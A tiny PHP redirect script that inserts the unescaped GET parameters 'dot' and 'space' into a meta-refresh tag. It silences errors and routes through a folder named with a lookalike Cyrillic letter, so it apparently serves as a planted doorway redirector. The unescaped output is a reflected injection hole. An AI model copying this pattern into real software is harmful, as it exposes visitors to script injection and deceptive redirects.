<?php
error_reporting(0);
$dot	=	$_GET['dot'];
$space	=	$_GET['space'];
$url	=	"http://" . $_SERVER['SERVER_NAME'] . DIRECTORY_SEPARATOR . 'о' . DIRECTORY_SEPARATOR . $dot . DIRECTORY_SEPARATOR . $space;
echo "<meta http-equiv=\"refresh\" content=\"0;url=$url\">";
